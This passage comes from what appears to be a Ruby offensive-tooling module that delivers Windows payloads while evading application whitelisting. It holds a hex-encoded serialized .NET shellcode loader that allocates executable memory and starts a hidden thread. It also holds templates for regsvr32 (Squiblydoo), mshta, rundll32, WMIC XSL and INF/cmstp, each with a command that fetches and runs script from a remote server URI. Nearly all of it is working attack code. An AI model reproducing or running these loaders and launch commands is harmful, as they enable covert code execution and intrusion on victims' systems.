    serialized_obj = serialized_obj & "00010010005A0000003D000100010011004400570011002D002B00110024005A0051801C00570051804F0057000000000080"
    serialized_obj = serialized_obj & "00912068005D00010000000000800091207500650005000000000080009120A90270000B000000000080009120E90276000D"
    serialized_obj = serialized_obj & "000000000080009120D8027C000F005020000000008600110210000F00C820000000008618300206001000D1200000000091"
    serialized_obj = serialized_obj & "18360280001000000001005D0000000200A70200000300D602000004002E0200000100D40200000200D10200000300570000"
    serialized_obj = serialized_obj & "0004002E0200000500730000000600820000000100EC0100000200A60200000100850000000200F402000001008A00090030"
    serialized_obj = serialized_obj & "020100110030020600190030020A002900300210003100300210003900300210004100300210004900300210005100300210"
    serialized_obj = serialized_obj & "005900300210006100300215006900300210007100300210008100DB012500890029022B009100BD022E009900FD02330091"
    serialized_obj = serialized_obj & "0029023C007900300206008900BD023F00080010004D000800140052002E000B0084002E0013008D002E001B00AC002E0023"
    serialized_obj = serialized_obj & "00B5002E002B00BF002E003300BF002E003B00BF002E004300B5002E004B00C5002E005300BF002E005B00BF002E006300DD"
    serialized_obj = serialized_obj & "002E006B00070143005B0014011A000A00F60101000001030068000100000105007500010000010700A902010000010900E9"
    serialized_obj = serialized_obj & "02020000010B00D80203000480000001000000000000000000000000005A00000002000000000000000000000044005F0000"
    serialized_obj = serialized_obj & "0000000000004B65726E656C3332006B65726E656C3332003C4D6F64756C653E0053575F4849444500494E46494E49544500"
    serialized_obj = serialized_obj & "504147455F455845435554455F524541445752495445004D454D5F434F4D4D49540053575F53484F57007361006D65746100"
    serialized_obj = serialized_obj & "6D73636F726C6962005669727475616C416C6C6F63004372656174655468726561640069640068576E6400636F6465004775"
    serialized_obj = serialized_obj & "69644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C654174747269627574"
    serialized_obj = serialized_obj & "6500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B4174747269627574"
    serialized_obj = serialized_obj & "6500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E6669677572617469"
    serialized_obj = serialized_obj & "6F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C617469"
    serialized_obj = serialized_obj & "6F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F64756374417474726962757465004173"
    serialized_obj = serialized_obj & "73656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E7941747472696275746500"
    serialized_obj = serialized_obj & "52756E74696D65436F6D7061746962696C6974794174747269627574650046726F6D426173653634537472696E670068004D"
    serialized_obj = serialized_obj & "61727368616C007573657233322E646C6C006D6574612E646C6C0053797374656D0073635F696E0053797374656D2E526566"
    serialized_obj = serialized_obj & "6C656374696F6E005A65726F0070002E63746F72002E6363746F720055496E745074720053797374656D2E446961676E6F73"
    serialized_obj = serialized_obj & "746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D65"
    serialized_obj = serialized_obj & "2E436F6D70696C6572536572766963657300446562756767696E674D6F646573006D730057616974466F7253696E676C654F"
    serialized_obj = serialized_obj & "626A656374006F705F4578706C6963697400436F6E766572740073740061747400476574436F6E736F6C6557696E646F7700"
    serialized_obj = serialized_obj & "53686F7757696E646F77006E436D6453686F7700436F707900000000000000C14A2CD1C6227D4EB4EC4A725CF92F57000420"
    serialized_obj = serialized_obj & "01010803200001052001011111042001010E04200101020A0706180E1D051D0518180500011D050E020618040001190B0800"
    serialized_obj = serialized_obj & "04011D05081808020619040001180808B77A5C561934E0890400000000040500000002060802060907000418181908180A00"
    serialized_obj = serialized_obj & "06181819181808101805000209180905000202180803000018030000010801000800000000001E0100010054021657726170"
    serialized_obj = serialized_obj & "4E6F6E457863657074696F6E5468726F777301080100070100000000090100046D657461000005010000000017010012436F"
    serialized_obj = serialized_obj & "7079726967687420C2A920203230313800002901002438363634373861362D633164322D346565652D383534652D64333464"
    serialized_obj = serialized_obj & "616463663630363900000C010007312E302E302E3000000501000100000000000000008895635A00000000020000001C0100"
    serialized_obj = serialized_obj & "00B0280000B00A000052534453A2837D38AC46534EBAD011D0D47C0C6701000000433A5C55736572735C4E69636B5C736F75"
    serialized_obj = serialized_obj & "7263655C7265706F735C6D6574615C6D6574615C6F626A5C44656275675C6D6574612E706462000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000F4290000000000"
    serialized_obj = serialized_obj & "00000000000E2A0000002000000000000000000000000000000000000000000000002A0000000000000000000000005F436F"
    serialized_obj = serialized_obj & "72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000"
    serialized_obj = serialized_obj & "003000008000000000000000000000000000000100000000004800000058400000FC0200000000000000000000FC02340000"
    serialized_obj = serialized_obj & "00560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE0000010000000100000000"
    serialized_obj = serialized_obj & "0000000100000000003F00000000000000040000000200000000000000000000000000000044000000010056006100720046"
    serialized_obj = serialized_obj & "0069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000"
    serialized_obj = serialized_obj & "000000B0045C020000010053007400720069006E006700460069006C00650049006E0066006F000000380200000100300030"
    serialized_obj = serialized_obj & "0030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043"
    serialized_obj = serialized_obj & "006F006D00700061006E0079004E0061006D0065000000000000000000320005000100460069006C00650044006500730063"
    serialized_obj = serialized_obj & "00720069007000740069006F006E00000000006D0065007400610000000000300008000100460069006C0065005600650072"
    serialized_obj = serialized_obj & "00730069006F006E000000000031002E0030002E0030002E003000000032000900010049006E007400650072006E0061006C"
    serialized_obj = serialized_obj & "004E0061006D00650000006D006500740061002E0064006C006C00000000004800120001004C006500670061006C0043006F"
    serialized_obj = serialized_obj & "007000790072006900670068007400000043006F0070007900720069006700680074002000A9002000200032003000310038"
    serialized_obj = serialized_obj & "0000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000003A0009"
    serialized_obj = serialized_obj & "0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006D006500740061002E0064006C"
    serialized_obj = serialized_obj & "006C00000000002A0005000100500072006F0064007500630074004E0061006D006500000000006D00650074006100000000"
    serialized_obj = serialized_obj & "00340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E0030"
    serialized_obj = serialized_obj & "00000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E"
    serialized_obj = serialized_obj & "0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000000000000000000000000000000000000000000000000002000000C000000203A000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    serialized_obj = serialized_obj & "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000010D0000000400"
    serialized_obj = serialized_obj & "0000091700000009060000000916000000061A0000002753797374656D2E5265666C656374696F6E2E417373656D626C7920"
    serialized_obj = serialized_obj & "4C6F616428427974655B5D29080000000A0B"

    entry_class = "meta"

    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject("System.IO.MemoryStream")
    Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
    Set al = CreateObject("System.Collections.ArrayList")

    Dim dec
    dec = decodeHex(serialized_obj)

    For Each i In dec
        stm.WriteByte i
    Next i

    stm.Position = 0

    Dim n As Object, d As Object, o As Object
    Set n = fmt.SurrogateSelector
    Set d = fmt.Deserialize_2(stm)
    al.Add n

    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    o.sc_in(enc)

    If Err.Number <> 0 Then
      DebugPrint Err.Description
      Err.Clear
    End If
End Function
    HEREDOC
  end


  def regsvr
    "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!--\nCopy the entire contents of this page to a file named regsvr.sct\nExecute by right clicking regsvr.sct and selecting Unregister\nor\nExecute using: C:\\Windows\\System32\\regsvr32.exe /s /n /u /i:#{get_uri.chomp("/")}/REGSVR scrobj.dll\n-->\n\n<package>\n<component id=\"meta\">\n<registration\ndescription=\"meta\"\nprogid=\"meta\"\nversion=\"1.00\"\nremotable=\"True\">\n<script language=\"JScript\">\n<![CDATA[\n" + jscript + "]]>\n</script>\n</registration>\n</component>\n</package>\n"
  end


  def hta
    "<!--\nCopy the entire contents of this page to a file named hta.hta\nExecute by double clicking hta.\nor\nExecute using: C:\\Windows\\System32\\mshta.exe #{get_uri.chomp("/")}/HTA\n-->\n\n<script language=\"JScript\">\n" + jscript + "</script>"
  end


  def rundll
    "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!--\nExecute using: C:\\Windows\\System32\\rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";o=GetObject(\"script:#{get_uri.chomp("/")}/RUNDLL\");o.Exec();close();\n-->\n\n<package>\n<component id=\"meta\">\n<registration\ndescription=\"meta\"\nprogid=\"meta\"\nversion=\"1.00\"\nclassid=\"{4046FD70-3F5B-4EDA-AAEE-3E147862CF21}\"\nremotable=\"True\">\n</registration>\n<script language=\"JScript\">\n<![CDATA[\n" + jscript + "]]>\n</script>\n</component>\n</package>\n"
  end


  def wmic
    "<?xml version=\"1.0\"?>\n<!--\nExecute using: C:\\Windows\\System32\\wbem\\wmic.exe os get /format:\"#{get_uri.chomp("/")}/WMIC\"\n-->\n<stylesheet\nxmlns=\"http://www.w3.org/1999/XSL/Transform\" xmlns:ms=\"urn:schemas-microsoft-com:xslt\"\nxmlns:user=\"placeholder\"\nversion=\"1.0\">\n<output method=\"text\"/>\n<ms:script implements-prefix=\"user\" language=\"JScript\">\n<![CDATA[\n" + jscript + "]]>\n</ms:script>\n</stylesheet>\n"
  end


  def inf
    <<-HEREDOC
;Copy the entire contents of this page to a file named inf.inf
;Execute using: C:\\Windows\\System32\\rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "FULL_PATH_TO_inf.inf"
;or
;C:\\Windows\\System32\\cmstp.exe /s inf.inf


[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection
[UnRegisterOCXSection]
%11%\\scrobj.dll,NI,#{get_uri.chomp("/")}/REGSVR
[Strings]
AppAct = "SOFTWARE\\Microsoft\\Connection Manager"
ServiceName="meta"
ShortSvcName="meta"
[DefaultInstall]
UnregisterDlls = Squiblydoo
[Squiblydoo]
11,,scrobj.dll,2,60,#{get_uri.chomp("/")}/REGSVR
    HEREDOC
  end
end

